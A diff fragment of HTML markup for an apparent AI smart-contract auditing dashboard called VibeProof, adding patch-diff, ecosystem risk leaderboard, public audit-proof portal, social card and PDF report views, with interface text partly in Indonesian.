+              <svg viewBox="0 0 24 24" class="w-4 h-4 text-zinc-600" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M5 12h14m-5-5 5 5-5 5"/></svg>
+              <span id="scoreAfter" class="font-mono text-lg font-extrabold text-safe">28</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="grid xl:grid-cols-[330px_minmax(0,1fr)] gap-5 items-start">
+        <div class="space-y-4">
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 overflow-hidden">
+            <div class="px-4 py-3 border-b border-zinc-800 bg-ink-850 flex items-center gap-2">
+              <p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Available Patches</p>
+              <span class="flex-1"></span>
+              <button id="applyAll" class="chip h-7 px-2.5 rounded-md border border-cyber/40 bg-cyber/10 text-cyber text-[10px] font-bold hover:bg-cyber/20 transition-colors">Apply all</button>
+              <button id="clearAll" class="chip h-7 px-2.5 rounded-md border border-zinc-700 bg-ink-700 text-zinc-400 text-[10px] font-bold hover:text-white transition-colors">Reset</button>
+            </div>
+            <div id="patchList" class="divide-y divide-zinc-800/80"></div>
+          </div>
+
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4 space-y-3">
+            <p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Instant Re-Audit</p>
+            <div class="flex items-center gap-4">
+              <div id="patchRing" class="shrink-0"></div>
+              <div class="min-w-0">
+                <p id="patchVerdict" class="chip text-[11px] font-extrabold tracking-widest uppercase text-crit">CRITICAL RISK</p>
+                <p class="mt-1 font-mono text-[10.5px] text-zinc-500" id="patchCounters">C 2 · H 2 · M 1 · L 1</p>
+              </div>
+            </div>
+            <div id="reauditLog" class="hidden rounded-lg border border-zinc-800 bg-ink-900 px-3 py-2 font-mono text-[10.5px] leading-5 text-zinc-500"></div>
+            <button id="reauditBtn" class="btn-cyber chip w-full h-11 rounded-xl bg-cyber text-ink-900 text-xs font-extrabold inline-flex items-center justify-center gap-2">
+              <svg viewBox="0 0 24 24" class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M3 12a9 9 0 1 0 3-6.7"/><path d="M3 4v5h5"/></svg>
+              Re-Audit Patched Code
+            </button>
+            <div class="grid grid-cols-2 gap-2">
+              <button id="exportRemix" class="chip h-10 rounded-lg border border-zinc-700 bg-ink-700 text-[11px] font-bold text-zinc-200 hover:border-cyber/60 hover:text-cyber transition-colors">Open in Remix ↗</button>
+              <button id="exportSol" class="chip h-10 rounded-lg border border-zinc-700 bg-ink-700 text-[11px] font-bold text-zinc-200 hover:border-cyber/60 hover:text-cyber transition-colors">Download .sol</button>
+              <button id="exportDiff" class="chip h-10 rounded-lg border border-zinc-700 bg-ink-700 text-[11px] font-bold text-zinc-200 hover:border-cyber/60 hover:text-cyber transition-colors">Copy unified diff</button>
+              <button id="exportZip" class="chip h-10 rounded-lg border border-safe/50 bg-safe/10 text-safe text-[11px] font-bold hover:bg-safe/20 transition-colors">Export Foundry zip</button>
+            </div>
+            <p class="font-mono text-[10px] text-zinc-600 leading-relaxed">Export zip berisi <span class="text-zinc-400">src/EtherVault.sol</span>, <span class="text-zinc-400">test/ExploitTest.t.sol</span>, <span class="text-zinc-400">foundry.toml</span> & <span class="text-zinc-400">remix-urls.txt</span> (simulated bundle).</p>
+          </div>
+        </div>
+
+        <div class="rounded-2xl border border-zinc-800 bg-ink-800 overflow-hidden">
+          <div class="flex flex-wrap items-center gap-2 px-4 py-3 border-b border-zinc-800 bg-ink-850">
+            <h3 class="text-sm font-bold text-white">Side-by-Side Diff</h3>
+            <span class="chip h-6 px-2.5 inline-flex items-center rounded-full bg-crit/10 border border-crit/40 font-mono text-[10px] text-crit">− vulnerable</span>
+            <span class="chip h-6 px-2.5 inline-flex items-center rounded-full bg-safe/10 border border-safe/40 font-mono text-[10px] text-safe">+ AI secured</span>
+            <span class="flex-1"></span>
+            <div class="flex items-center gap-1.5">
+              <button data-dtab="split" class="dtab chip h-8 px-3 rounded-lg border border-cyber/50 bg-cyber/10 text-cyber text-[11px] font-bold">Split</button>
+              <button data-dtab="unified" class="dtab chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 text-zinc-400 text-[11px] font-bold hover:text-white">Unified</button>
+            </div>
+          </div>
+          <div class="grid grid-cols-2 gap-px bg-zinc-800 border-b border-zinc-800 font-mono text-[10px] uppercase tracking-widest text-zinc-500">
+            <div class="bg-ink-850 px-4 py-2">EtherVault.sol <span class="text-crit normal-case">(vulnerable · score 28)</span></div>
+            <div class="bg-ink-850 px-4 py-2">EtherVault.sol <span class="text-safe normal-case">(AI secured · score <span id="diffScore">28</span>)</span></div>
+          </div>
+          <div id="diffSplit" class="scroll-thin max-h-[560px] overflow-auto bg-ink-900"></div>
+          <pre id="diffUnified" class="code scroll-thin hidden max-h-[560px] overflow-auto px-4 py-3 bg-ink-900 text-zinc-300"></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════ VIEW 3 · RISK RADAR ═══════════ -->
+    <section id="view-radar" class="space-y-5 hidden">
+      <div class="relative overflow-hidden rounded-2xl border border-cyber/25">
+        <div class="absolute inset-0 suite-bg opacity-20"></div>
+        <div class="absolute inset-0 bg-gradient-to-r from-ink-900 via-ink-900/85 to-ink-900/40"></div>
+        <div class="relative p-6 flex flex-wrap items-center gap-4">
+          <span class="grid place-items-center w-12 h-12 rounded-xl border border-cyber/40 bg-cyber/10 text-cyber">
+            <svg viewBox="0 0 24 24" class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="4.5"/><path d="M12 12 19 6"/></svg>
+          </span>
+          <div class="flex-1 min-w-[240px]">
+            <p class="chip text-[10px] font-extrabold tracking-[0.25em] uppercase text-cyber">Priority #3 · Ecosystem Fit</p>
+            <h1 class="mt-1 text-xl sm:text-2xl font-extrabold text-white tracking-tight">BOT Chain Ecosystem Risk Radar & Leaderboard</h1>
+            <p class="mt-1 text-[13px] text-zinc-400">Pantau kesehatan keamanan seluruh ekosistem BOT Chain — leaderboard protokol, watchdog deployment baru, dan metrik keselamatan agregat.</p>
+          </div>
+          <span id="radarNet" class="chip h-9 px-3 inline-flex items-center rounded-lg border border-zinc-700 bg-ink-800/80 font-mono text-[11px] text-zinc-300">Testnet · 968</span>
+        </div>
+      </div>
+
+      <div class="grid lg:grid-cols-3 gap-4">
+        <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-5">
+          <p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500 mb-3">Ecosystem Safety Metric</p>
+          <div class="relative grid place-items-center">
+            <svg id="safetyGauge" viewBox="0 0 220 130" class="w-full max-w-[260px]"></svg>
+            <div class="absolute bottom-2 text-center">
+              <p id="safetyPct" class="font-mono text-3xl font-extrabold text-safe">0%</p>
+              <p class="text-[10px] uppercase tracking-widest text-zinc-500">contracts safe</p>
+            </div>
+          </div>
+          <ul id="safetyBreak" class="mt-3 space-y-2 font-mono text-[11px]"></ul>
+        </div>
+
+        <div class="lg:col-span-2 grid sm:grid-cols-2 xl:grid-cols-4 gap-4">
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4"><p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Contracts Deployed (30d)</p><p class="mt-2 font-mono text-2xl font-extrabold text-white">3,918</p><p class="mt-1 font-mono text-[10px] text-safe">+18.4%</p></div>
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4"><p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Bytecode Unverified</p><p class="mt-2 font-mono text-2xl font-extrabold text-warn">1,247</p><p class="mt-1 font-mono text-[10px] text-zinc-500">31.8% dari total</p></div>
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4"><p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500">VibeProof Certified</p><p class="mt-2 font-mono text-2xl font-extrabold text-cyber">1,284</p><p class="mt-1 font-mono text-[10px] text-zinc-500">via certifyAudit()</p></div>
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4"><p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Critical Exposure</p><p class="mt-2 font-mono text-2xl font-extrabold text-crit">86</p><p class="mt-1 font-mono text-[10px] text-zinc-500">TVL ±412,880 BOT</p></div>
+          <div class="sm:col-span-2 xl:col-span-4 rounded-2xl border border-zinc-800 bg-ink-800 p-4">
+            <p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500 mb-3">Safety by Category</p>
+            <div id="catBars" class="space-y-2.5"></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="grid xl:grid-cols-[minmax(0,1.35fr)_minmax(0,1fr)] gap-4 items-start">
+        <div class="rounded-2xl border border-zinc-800 bg-ink-800 overflow-hidden">
+          <div class="flex flex-wrap items-center gap-2 px-4 py-3 border-b border-zinc-800 bg-ink-850">
+            <h3 class="text-sm font-bold text-white">Protocol Security Leaderboard</h3>
+            <span class="flex-1"></span>
+            <div class="flex flex-wrap gap-1.5" id="lbCats"></div>
+          </div>
+          <div class="overflow-x-auto scroll-thin">
+            <table class="tbl w-full text-left font-mono text-[11.5px]">
+              <thead><tr class="bg-ink-850"><th class="px-4 py-2.5">#</th><th class="px-3 py-2.5">Protocol</th><th class="px-3 py-2.5 hidden sm:table-cell">Category</th><th class="px-3 py-2.5">Security Score</th><th class="px-3 py-2.5 hidden md:table-cell">Audit Status</th><th class="px-3 py-2.5 hidden lg:table-cell">TVL</th><th class="px-4 py-2.5 text-right">7d</th></tr></thead>
+              <tbody id="lbBody"></tbody>
+            </table>
+          </div>
+        </div>
+
+        <div class="rounded-2xl border border-zinc-800 bg-ink-800 overflow-hidden">
+          <div class="flex items-center gap-2 px-4 py-3 border-b border-zinc-800 bg-ink-850">
+            <span class="w-2 h-2 rounded-full bg-safe dot-live"></span>
+            <h3 class="text-sm font-bold text-white">Deployment Watchdog</h3>
+            <span class="chip h-5 px-2 inline-flex items-center rounded bg-ink-700 border border-zinc-800 font-mono text-[9px] text-zinc-400">mempool stream</span>
+            <span class="flex-1"></span>
+            <button id="watchToggle" class="chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 text-[11px] font-bold text-zinc-200 hover:border-cyber/60 transition-colors">Pause</button>
+          </div>
+          <div id="watchFeed" class="scroll-thin max-h-[560px] overflow-y-auto divide-y divide-zinc-800/70"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════ VIEW 4 · PROOF PORTAL ═══════════ -->
+    <section id="view-proof" class="space-y-5 hidden">
+      <div class="relative overflow-hidden rounded-2xl border border-safe/25">
+        <div class="absolute inset-0 suite-bg opacity-20"></div>
+        <div class="absolute inset-0 bg-gradient-to-r from-ink-900 via-ink-900/85 to-ink-900/40"></div>
+        <div class="relative p-6 flex flex-wrap items-center gap-4">
+          <span class="grid place-items-center w-12 h-12 rounded-xl border border-safe/40 bg-safe/10 text-safe">
+            <svg viewBox="0 0 24 24" class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M7 3h7l4 4v14H7z"/><path d="M14 3v4h4"/><path d="m10 14 1.6 1.6L15 12"/></svg>
+          </span>
+          <div class="flex-1 min-w-[240px]">
+            <p class="chip text-[10px] font-extrabold tracking-[0.25em] uppercase text-safe">Priority #4 · Trust & Sharing</p>
+            <h1 class="mt-1 text-xl sm:text-2xl font-extrabold text-white tracking-tight">Public Verification Portal & Executive PDF Report</h1>
+            <p class="mt-1 text-[13px] text-zinc-400">Permalink publik tanpa wallet, laporan PDF sekelas CertiK/OpenZeppelin, dan dynamic social card siap share ke X & Farcaster.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4 flex flex-wrap items-center gap-3">
+        <label class="flex-1 min-w-[240px]">
+          <span class="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Pilih sertifikat audit</span>
+          <select id="proofSelect" class="mt-1.5 w-full h-11 px-3 rounded-lg bg-ink-900 border border-zinc-800 font-mono text-xs text-zinc-200 focus:border-cyber/60 focus:outline-none"></select>
+        </label>
+        <label class="flex-[2] min-w-[280px]">
+          <span class="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Public permalink (/proof/:hash)</span>
+          <div class="mt-1.5 flex gap-2">
+            <input id="permalink" readonly class="flex-1 h-11 px-3 rounded-lg bg-ink-900 border border-zinc-800 font-mono text-[11px] text-cyber focus:outline-none" />
+            <button id="copyPermalink" class="chip h-11 px-4 rounded-lg border border-zinc-700 bg-ink-700 text-xs font-bold text-zinc-200 hover:border-cyber/60 hover:text-cyber transition-colors">Copy</button>
+          </div>
+        </label>
+        <span class="chip h-9 px-3 inline-flex items-center rounded-full border border-zinc-700 bg-ink-850 text-[10.5px] font-mono text-zinc-400 self-end">🔓 wallet-free · read-only RPC</span>
+      </div>
+
+      <div class="flex flex-wrap border-b border-zinc-800 gap-1">
+        <button data-ptab="public" class="ptab chip h-10 px-4 text-xs font-bold text-cyber border-b-2 border-cyber -mb-px">Public Proof</button>
+        <button data-ptab="og" class="ptab chip h-10 px-4 text-xs font-bold text-zinc-500 border-b-2 border-transparent -mb-px hover:text-zinc-300">Dynamic Social Card (OG)</button>
+        <button data-ptab="pdf" class="ptab chip h-10 px-4 text-xs font-bold text-zinc-500 border-b-2 border-transparent -mb-px hover:text-zinc-300">Executive PDF Report</button>
+      </div>
+
+      <!-- public proof -->
+      <div id="ppane-public" class="grid xl:grid-cols-[minmax(0,1fr)_340px] gap-5 items-start">
+        <div class="relative rounded-2xl border border-cyber/25 overflow-hidden">
+          <div class="absolute inset-0 grid-lines opacity-40"></div>
+          <div class="relative p-6 sm:p-8">
+            <div class="flex flex-wrap items-center gap-3">
+              <span class="chip inline-flex items-center gap-2 h-8 px-4 rounded-full border border-cyber/50 bg-cyber/10 text-cyber text-[10px] font-extrabold tracking-[0.2em] uppercase">
+                <svg viewBox="0 0 24 24" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 3 5 6v5c0 4.4 3 8.1 7 10 4-1.9 7-5.6 7-10V6l-7-3Z"/><path d="m9.5 11.6 1.8 1.8 3.4-3.6"/></svg>
+                Verified Audit Proof — BOT Chain
+              </span>
+              <span class="chip h-8 px-3 inline-flex items-center rounded-full border border-zinc-700 bg-ink-800 font-mono text-[10.5px] text-zinc-400" id="pubNet">Testnet · 968</span>
+            </div>
+
+            <div class="mt-6 flex flex-wrap items-center gap-6">
+              <div id="pubRing" class="shrink-0"></div>
+              <div class="min-w-0 flex-1">
+                <h2 id="pubContract" class="font-mono text-2xl font-extrabold text-white break-all">—</h2>
+                <p id="pubVerdict" class="mt-2 chip inline-flex items-center h-8 px-3.5 rounded-full border text-[11px] font-extrabold tracking-widest uppercase border-safe/50 bg-safe/10 text-safe">—</p>
+                <p id="pubSummary" class="mt-3 text-[13px] leading-relaxed text-zinc-400 max-w-xl">—</p>
+              </div>
+            </div>
+
+            <dl class="mt-6 rounded-xl border border-zinc-800 bg-ink-900/80 divide-y divide-zinc-800/80 font-mono text-[11.5px]">
+              <div class="flex gap-3 px-4 py-2.5"><dt class="w-32 shrink-0 text-zinc-500">Code Hash</dt><dd id="pubHash" class="flex-1 break-all text-cyber">—</dd></div>
+              <div class="flex gap-3 px-4 py-2.5"><dt class="w-32 shrink-0 text-zinc-500">Auditor Wallet</dt><dd id="pubAuditor" class="flex-1 break-all text-zinc-300">—</dd></div>
+              <div class="flex gap-3 px-4 py-2.5"><dt class="w-32 shrink-0 text-zinc-500">Transaction</dt><dd id="pubTx" class="flex-1 break-all text-zinc-300">—</dd></div>
+              <div class="flex gap-3 px-4 py-2.5"><dt class="w-32 shrink-0 text-zinc-500">Block / Time</dt><dd id="pubBlock" class="flex-1 text-zinc-300">—</dd></div>
+              <div class="flex gap-3 px-4 py-2.5"><dt class="w-32 shrink-0 text-zinc-500">Contract</dt><dd class="flex-1 break-all text-zinc-300">0x97E0C6A5A352aF3e35A221d6d13d7890a8a6F578</dd></div>
+            </dl>
+
+            <div class="mt-5 flex flex-wrap gap-2">
+              <a id="pubExplorer" href="#" target="_blank" rel="noopener" class="chip h-11 px-4 rounded-lg bg-cyber text-ink-900 text-xs font-extrabold inline-flex items-center gap-2 hover:brightness-110 transition">View on BOTScan ↗</a>
+              <button id="pubShareX" class="chip h-11 px-4 rounded-lg border border-zinc-700 bg-ink-700 text-xs font-bold text-zinc-100 inline-flex items-center gap-2 hover:border-cyber/60 transition-colors">Share on X · @BOTChain_ai</button>
+              <button id="pubCopyBadge" class="chip h-11 px-4 rounded-lg border border-zinc-700 bg-ink-700 text-xs font-bold text-zinc-200 hover:border-cyber/60 transition-colors">Copy README Badge</button>
+            </div>
+          </div>
+          <p class="relative px-6 sm:px-8 pb-6 font-mono text-[10px] text-zinc-600">Proof bersifat immutable — tercatat permanen di BOT Chain dan dapat diverifikasi ulang kapan pun melalui getAudit(bytes32).</p>
+        </div>
+
+        <div class="space-y-4">
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-5 text-center">
+            <p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500 mb-3">QR → BOTScan TX</p>
+            <div id="qrBox" class="inline-block rounded-xl border border-zinc-700 bg-white p-3"></div>
+            <p class="mt-3 font-mono text-[10px] text-zinc-500 break-all" id="qrCaption">—</p>
+          </div>
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4">
+            <p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500 mb-2">Markdown Badge</p>
+            <div class="mb-3"><span class="chip inline-flex overflow-hidden rounded font-mono text-[10px] font-bold h-5"><span class="px-2 bg-[#555] text-white grid place-items-center">VibeProof</span><span id="pubBadgeScore" class="px-2 bg-safe text-white grid place-items-center">—</span></span></div>
+            <code id="pubBadgeMd" class="block font-mono text-[10px] text-zinc-500 break-all leading-relaxed"></code>
+          </div>
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4">
+            <p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500 mb-2">Verification Steps</p>
+            <ol class="space-y-2 text-[12px] text-zinc-400 list-decimal list-inside">
+              <li>Buka permalink atau scan QR.</li>
+              <li>Hitung ulang <code class="font-mono text-cyber">keccak256(source)</code>.</li>
+              <li>Panggil <code class="font-mono text-cyber">getAudit(hash)</code> di BOTScan.</li>
+              <li>Cocokkan score, verdict, auditor & block.</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+      <!-- OG card -->
+      <div id="ppane-og" class="hidden space-y-4">
+        <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-5">
+          <div class="flex flex-wrap items-center gap-2 mb-4">
+            <h3 class="text-sm font-bold text-white">Dynamic Social Card Preview</h3>
+            <span class="chip h-6 px-2.5 inline-flex items-center rounded-full bg-ink-700 border border-zinc-800 font-mono text-[10px] text-zinc-400">1200 × 630 · X / Farcaster / Discord</span>
+            <span class="flex-1"></span>
+            <button id="copyOgUrl" class="chip h-9 px-3 rounded-lg border border-zinc-700 bg-ink-700 text-[11px] font-bold text-zinc-200 hover:border-cyber/60 hover:text-cyber transition-colors">Copy OG Image URL</button>
+            <button id="ogShareX" class="chip h-9 px-3 rounded-lg border border-cyber/50 bg-cyber/10 text-cyber text-[11px] font-bold hover:bg-cyber/20 transition-colors">Share on X</button>
+          </div>
+          <div class="og-wrap border border-zinc-800">
+            <div id="ogCard" class="og-inner relative bg-ink-950 overflow-hidden">
+              <div class="absolute inset-0 suite-bg opacity-45"></div>
+              <div class="absolute inset-0 grid-lines opacity-70"></div>
+              <div class="absolute -top-24 -right-24 w-[520px] h-[520px] rounded-full bg-cyber/15 blur-[110px]"></div>
+              <div class="relative h-full p-14 flex flex-col">
+                <div class="flex items-center gap-4">
+                  <span class="grid place-items-center w-14 h-14 rounded-2xl border border-cyber/50 bg-cyber/10">
+                    <svg viewBox="0 0 24 24" class="w-8 h-8 text-cyber" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2.5 4.5 5.6v5.2c0 4.7 3.2 8.6 7.5 10.7 4.3-2.1 7.5-6 7.5-10.7V5.6L12 2.5Z"/><path d="m9 11.8 2.2 2.2L15.4 9.6"/></svg>
+                  </span>
+                  <div>
+                    <p class="text-white text-4xl font-extrabold tracking-tight">Vibe<span class="text-cyber">Proof</span></p>
+                    <p class="text-zinc-400 text-lg font-mono">AI Smart Contract Auditor · BOT Chain</p>
+                  </div>
+                  <div class="ml-auto text-right">
+                    <p class="text-zinc-500 text-base font-mono uppercase tracking-[0.2em]">Security Score</p>
+                    <p id="ogScore" class="text-8xl font-extrabold font-mono text-safe leading-none">96</p>
+                    <p class="text-zinc-500 text-lg font-mono">/ 100</p>
+                  </div>
+                </div>
+                <div class="mt-auto">
+                  <p id="ogVerdict" class="inline-flex items-center h-12 px-6 rounded-full border-2 border-safe/60 bg-safe/10 text-safe text-2xl font-extrabold tracking-widest uppercase">PASSED — SAFE</p>
+                  <p id="ogContract" class="mt-6 text-white text-5xl font-extrabold font-mono truncate">SafeDAppVault.sol</p>
+                  <div class="mt-5 flex items-center gap-6 font-mono text-lg text-zinc-400">
+                    <span id="ogHash">0x0000…0000</span>
+                    <span id="ogChain">BOT Chain Testnet · 968</span>
+                    <span id="ogTx">tx 0x0000…0000</span>
+                  </div>
+                </div>
+              </div>
+              <div class="absolute inset-0 pointer-events-none" style="background:repeating-linear-gradient(135deg,rgba(255,255,255,.015) 0 2px,transparent 2px 9px)"></div>
+            </div>
+          </div>
+          <div class="mt-4 grid sm:grid-cols-3 gap-3 font-mono text-[10.5px]">
+            <div class="rounded-lg border border-zinc-800 bg-ink-850 px-3 py-2"><span class="text-zinc-500">og:image</span><br><span id="ogUrl1" class="text-cyber break-all">—</span></div>
+            <div class="rounded-lg border border-zinc-800 bg-ink-850 px-3 py-2"><span class="text-zinc-500">og:title</span><br><span id="ogUrl2" class="text-zinc-300 break-all">—</span></div>
+            <div class="rounded-lg border border-zinc-800 bg-ink-850 px-3 py-2"><span class="text-zinc-500">twitter:card</span><br><span class="text-zinc-300">summary_large_image</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- PDF -->
+      <div id="ppane-pdf" class="hidden space-y-4">
+        <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-5">
+          <div class="flex flex-wrap items-center gap-3">
+            <div>
+              <h3 class="text-sm font-bold text-white">Executive Audit Report (A4 · 4 halaman)</h3>
+              <p class="mt-1 text-[12px] text-zinc-500">Standar industri: executive summary, methodology, tabel temuan, metadata blok BOT Chain, QR stamp & watermark keaslian.</p>
+            </div>
+            <span class="flex-1"></span>
+            <button id="pdfPreview" class="chip h-11 px-4 rounded-lg border border-zinc-700 bg-ink-700 text-xs font-bold text-zinc-200 hover:border-cyber/60 hover:text-cyber transition-colors">Preview</button>
+            <button id="pdfDownload" class="chip h-11 px-4 rounded-lg bg-cyber text-ink-900 text-xs font-extrabold hover:brightness-110 transition">Download PDF / Print</button>
+          </div>
+          <div id="pdfMeta" class="mt-4 grid sm:grid-cols-4 gap-px bg-zinc-800 rounded-lg overflow-hidden font-mono text-[10.5px]">
+            <div class="bg-ink-850 px-3 py-2"><span class="text-zinc-500">Doc ID</span><br><span id="pdfId" class="text-zinc-200">—</span></div>
+            <div class="bg-ink-850 px-3 py-2"><span class="text-zinc-500">Engine</span><br><span class="text-zinc-200">v2.3 · solc 0.8.24</span></div>
+            <div class="bg-ink-850 px-3 py-2"><span class="text-zinc-500">Pages</span><br><span class="text-zinc-200">4 · A4 portrait</span></div>
+            <div class="bg-ink-850 px-3 py-2"><span class="text-zinc-500">Watermark</span><br><span class="text-cyber">VibeProof VERIFIED</span></div>
+          </div>
+        </div>
+
+        <div id="pdfPreviewBox" class="rounded-2xl border border-zinc-800 bg-[#f4f4f5] p-4 sm:p-8">
+          <div class="mx-auto max-w-[820px] bg-white text-zinc-900 shadow-2xl rounded-sm overflow-hidden">
+            <div class="relative px-10 pt-10 pb-6 border-b-4 border-cyan-500">
+              <div class="absolute inset-0 opacity-[0.06] grid place-items-center pointer-events-none"><span class="text-[64px] font-extrabold tracking-widest rotate-[-24deg] text-zinc-900">VIBIPROOF VERIFIED</span></div>
+              <div class="relative flex items-start gap-4">
+                <span class="grid place-items-center w-12 h-12 rounded-xl bg-cyan-500 text-white shrink-0">
+                  <svg viewBox="0 0 24 24" class="w-7 h-7" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2.5 4.5 5.6v5.2c0 4.7 3.2 8.6 7.5 10.7 4.3-2.1 7.5-6 7.5-10.7V5.6L12 2.5Z"/><path d="m9 11.8 2.2 2.2L15.4 9.6"/></svg>
+                </span>
+                <div class="flex-1">
+                  <h1 class="text-2xl font-extrabold tracking-tight">Smart Contract Security Audit Report</h1>
+                  <p class="mt-1 text-sm text-zinc-600 font-mono" id="pvContract">—</p>
+                </div>
+                <div class="text-right">
+                  <p class="text-[10px] uppercase tracking-widest text-zinc-500">Security Score</p>
+                  <p class="text-4xl font-extrabold font-mono" id="pvScore">—</p>
+                  <p class="text-[11px] font-bold uppercase tracking-widest" id="pvVerdict">—</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="px-10 py-6 space-y-6">
+              <section>
+                <h2 class="text-sm font-extrabold uppercase tracking-widest text-zinc-500 mb-2">1 · Executive Summary</h2>
+                <p class="text-[13px] leading-relaxed text-zinc-700" id="pvSummary">—</p>
+              </section>
+              <section>
+                <h2 class="text-sm font-extrabold uppercase tracking-widest text-zinc-500 mb-2">2 · Scope & Methodology</h2>
+                <p class="text-[13px] leading-relaxed text-zinc-700">Analisis statis AST (solc 0.8.24), 42 heuristik kerentanan berbasis SWC Registry, graph traversal reentrancy, pemeriksaan access control & unchecked call, ditambah optimisasi gas opcode-level. Bukti audit di-anchor ke BOT Chain via <span class="font-mono">VibeProof.certifyAudit()</span>.</p>
+              </section>
+              <section>
+                <h2 class="text-sm font-extrabold uppercase tracking-widest text-zinc-500 mb-2">3 · Findings</h2>
+                <table class="w-full text-[12px] border-collapse">
+                  <thead><tr class="bg-zinc-100 text-left text-[10px] uppercase tracking-widest text-zinc-500"><th class="px-3 py-2 border border-zinc-200">Severity</th><th class="px-3 py-2 border border-zinc-200">Finding</th><th class="px-3 py-2 border border-zinc-200">Line</th><th class="px-3 py-2 border border-zinc-200">Remediation</th></tr></thead>
+                  <tbody id="pvFindings"></tbody>
+                </table>
+              </section>
+              <section class="grid grid-cols-2 gap-6">
+                <div>
+                  <h2 class="text-sm font-extrabold uppercase tracking-widest text-zinc-500 mb-2">4 · On-Chain Attestation</h2>
+                  <dl class="text-[11.5px] font-mono space-y-1.5">
+                    <div class="flex gap-2"><dt class="w-24 text-zinc-500">Network</dt><dd id="pvNet">—</dd></div>
+                    <div class="flex gap-2"><dt class="w-24 text-zinc-500">Code Hash</dt><dd id="pvHash" class="break-all">—</dd></div>
+                    <div class="flex gap-2"><dt class="w-24 text-zinc-500">TX Hash</dt><dd id="pvTx" class="break-all">—</dd></div>
+                    <div class="flex gap-2"><dt class="w-24 text-zinc-500">Block</dt><dd id="pvBlock">—</dd></div>
+                    <div class="flex gap-2"><dt class="w-24 text-zinc-500">Timestamp</dt><dd id="pvTime">—</dd></div>
+                    <div class="flex gap-2"><dt class="w-24 text-zinc-500">Auditor</dt><dd id="pvAuditor" class="break-all">—</dd></div>
+                  </dl>
+                </div>
+                <div class="text-center">
+                  <h2 class="text-sm font-extrabold uppercase tracking-widest text-zinc-500 mb-2">Verify Stamp</h2>
+                  <div id="pvQr" class="inline-block rounded-lg border border-zinc-300 bg-white p-2"></div>
+                  <p class="mt-2 text-[10px] font-mono text-zinc-500 break-all" id="pvQrCap">—</p>
+                </div>
+              </section>
+            </div>
+            <div class="px-10 py-4 border-t border-zinc-200 flex items-center gap-3 text-[10.5px] font-mono text-zinc-500">
+              <span>© 2025 VibeProof · Girl Meets Tech × On Chain Consultancy Vol.2</span>
+              <span class="flex-1"></span>
+              <span id="pvDocId">—</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════ VIEW 5 · REPO IMPORTER ═══════════ -->
+    <section id="view-repo" class="space-y-5 hidden">
+      <div class="relative overflow-hidden rounded-2xl border border-zinc-800">
+        <div class="absolute inset-0 suite-bg opacity-20"></div>
+        <div class="absolute inset-0 bg-gradient-to-r from-ink-900 via-ink-900/85 to-ink-900/40"></div>
+        <div class="relative p-6 flex flex-wrap items-center gap-4">
+          <span class="grid place-items-center w-12 h-12 rounded-xl border border-zinc-700 bg-ink-800 text-cyber">
+            <svg viewBox="0 0 24 24" class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 5a2 2 0 0 1 2-2h9l5 5v11a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2z"/><path d="M8 10h8M8 14h5"/></svg>
+          </span>
+          <div class="flex-1 min-w-[240px]">
+            <p class="chip text-[10px] font-extrabold tracking-[0.25em] uppercase text-zinc-400">Priority #5 · Enterprise Scale</p>
+            <h1 class="mt-1 text-xl sm:text-2xl font-extrabold text-white tracking-tight">Multi-Contract & GitHub Repository Importer</h1>
+            <p class="mt-1 text-[13px] text-zinc-400">Muat seluruh proyek Foundry/Hardhat: URL GitHub atau drag-and-drop zip berisi banyak file <span class="font-mono">.sol</span>, lalu audit batch + petakan arsitektur dependensi.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="grid xl:grid-cols-[minmax(0,1fr)_minmax(0,1.25fr)] gap-5 items-start">
+        <div class="space-y-4">
